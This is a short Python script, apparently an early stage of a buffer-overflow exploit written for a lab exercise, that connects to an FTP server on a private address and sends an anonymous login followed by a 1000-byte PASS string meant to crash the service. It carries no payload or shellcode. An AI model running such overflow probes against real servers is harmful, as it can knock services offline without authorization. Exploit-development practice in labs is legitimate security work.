#!/usr/bin/python
# -*- coding: UTF-8 -*-
# Autor: 1º Ten Chitolina - 0x4rt3mis

import socket
import sys
from struct import pack

rhost = "192.168.122.49"
rport = int('21')
ftpuser = b'anonymous'

buf = b""
buf += b"A" * 1000

password = b"PASS " + buf + b"\r\n"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((rhost,rport))
client.recv(1024)
client.sendall(b"USER " + ftpuser + b"\r\n")
client.recv(1024)
client.sendall(password)
client.close()

print("\nDone!")
